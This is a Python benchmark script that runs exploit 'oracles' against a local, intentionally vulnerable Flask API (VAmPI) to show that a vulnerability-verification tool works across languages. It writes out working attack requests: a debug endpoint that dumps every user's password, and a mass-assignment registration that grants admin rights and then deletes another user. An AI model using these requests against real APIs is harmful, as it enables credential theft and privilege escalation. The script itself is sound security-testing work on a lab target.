"""Cross-language proof: our HTTP oracles confirm bugs in a PYTHON/Flask app (VAmPI),
using the SAME oracle code written for the Node app, with only an auth config changed.

The verification layer (exploit / regression / hardening / metamorphic oracles) speaks HTTP,
not JavaScript, so it is language-neutral. What is app-specific — how to start the app, how to
log in — is a per-app adapter; here the adapter is VAmPI's JWT login config (`VAMPI_AUTH`).

Setup (not done by this script):
    docker build -t vampi:local benchmark_workspace/VAmPI
    docker run -d --name vampi -p 127.0.0.1:5001:5000 -e vulnerable=1 vampi:local
    curl -s http://127.0.0.1:5001/createdb        # seed users: name1/pass1, name2/pass2, admin/pass1

Run:  python -m benchmarks.crosslang_vampi
"""
import json
import sys
import urllib.error
import urllib.request

from benchmarks.nodegoat.exploit import run_exploit, Session

VAMPI = "http://127.0.0.1:5001"

# The per-app adapter: how a role authenticates. This is the ONLY app-specific part; every
# oracle below is the unchanged code used against the Node app.
VAMPI_AUTH = {
    "kind": "bearer_json", "body_json": True, "login_path": "/users/v1/login",
    "user_field": "username", "pass_field": "password", "token_field": "auth_token",
    "roles": {"admin": ["admin", "pass1"], "user": ["name1", "pass1"], "user2": ["name2", "pass2"]},
}


def _seed():
    urllib.request.urlopen(VAMPI + "/createdb", timeout=10).read()


def _req(method, path, body=None, token=None):
    h = {"Content-Type": "application/json"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    r = urllib.request.Request(VAMPI + path, data=json.dumps(body).encode() if body else None,
                               headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as x:
            return x.status, x.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def check_data_exposure():
    """Excessive data exposure (CWE-213): /_debug dumps every user's password. Confirmed by the
    unchanged single-request oracle."""
    hit, detail = run_exploit(VAMPI, {
        "method": "GET", "path": "/users/v1/_debug", "login_as": "none",
        "success_if": {"status": 200, "body_regex": '"password"'}, "auth": VAMPI_AUTH})
    return hit, detail


def check_mass_assignment():
    """Mass assignment (CWE-915): register sets its own admin flag; the new account can then do an
    admin-only action. Access-control reasoning (the metamorphic principle) on a Flask + JWT app."""
    _seed()
    _req("POST", "/users/v1/register",
         {"username": "kavachadmin", "password": "x", "email": "k@k.com", "admin": True})
    tok = json.loads(_req("POST", "/users/v1/login", {"username": "kavachadmin", "password": "x"})[1]).get("auth_token")
    status, _ = _req("DELETE", "/users/v1/name2", token=tok)   # admin-only; name1 gets 401 here
    _seed()
    return status == 200, f"newly-registered user performed an admin-only action (status {status})"


def check_jwt_login_ports():
    """The generalized Session performs VAmPI's JWT login and attaches the bearer token — proof the
    auth layer ports with only a config, no oracle change."""
    s = Session(VAMPI, auth=VAMPI_AUTH)
    ok = s.login("user")
    r = s.request("GET", "/users/v1/name1")
    return bool(ok and s.bearer and r.status == 200), f"token attached, authed GET -> {r.status}"


def main():
    try:
        _seed()
    except Exception as e:  # noqa: BLE001
        print(f"VAmPI not reachable at {VAMPI} — start it (see this file's header). {e}")
        return 2
    results = [
        ("data-exposure (CWE-213)", *check_data_exposure()),
        ("mass-assignment (CWE-915)", *check_mass_assignment()),
        ("JWT auth ports to our Session", *check_jwt_login_ports()),
    ]
    ok = True
    for name, hit, detail in results:
        print(f"  {'CONFIRMED' if hit else 'MISS':10} {name}  ::  {detail}")
        ok = ok and hit
    print("cross-language verification:", "PROVEN" if ok else "incomplete")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
